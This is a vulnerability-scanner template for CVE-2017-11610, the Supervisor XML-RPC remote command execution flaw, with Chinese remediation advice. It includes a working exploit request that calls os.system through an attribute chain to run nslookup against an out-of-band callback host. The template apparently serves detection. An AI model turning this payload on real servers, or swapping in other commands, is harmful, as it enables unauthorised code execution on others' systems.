id: CVE-2017-11610
info:
  name: Supervisor XMLRPC Exec
  author:
  - l0ne1y
  description: |-
    Supervisor远程命令执行漏洞
    Supervisor官方披露了编号为CVE-2017-11610的Supervisor远程命令执行漏洞。在一定场景下（RPC端口可被访问且存在弱口令），攻击者可利用该漏洞发送恶意XML-RPC请求进而获取服务器的操作权限
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://github.com/Supervisor/supervisor/issues/964
    临时修复方案：
    1、如果不需要使用该服务软件，建议关停卸载该软件，同时检查服务器上是否存在不正常的进程、或异常账号，确保服务器运行正常;
    2、如需使用该服务软件，建议卸载后，重新安装升级到官方最新3.3.3版本，重新安装前建议通过抓取私有镜像和云硬盘快照来备份系统和数据;
    3、由于该漏洞利用Supervisor开放的9001管理端口发起远程攻击，用户可以使用安全组策略屏蔽公网入、内网入方向的9001端口；
    4、为Supervisor配置RPC登录认证强密码，建议密码至少8位以上，包括大小写字母、数字、特殊字符等混合体。
requests:
- matchers:
  - type: word
    part: interactsh_protocol
    words:
    - dns
  - type: word
    part: header
    words:
    - text/xml
  - type: word
    condition: and
    part: body
    words:
    - <methodResponse>
    - <int>
  matchers-condition: and
  raw:
  - |
    POST /RPC2 HTTP/1.1
    Host: {{Hostname}}
    Accept: text/xml
    Content-type: text/xml

    <methodCall>
      <methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
      <params>
        <param>
          <string>nslookup {{interactsh-url}}</string>
        </param>
      </params>
    </methodCall>
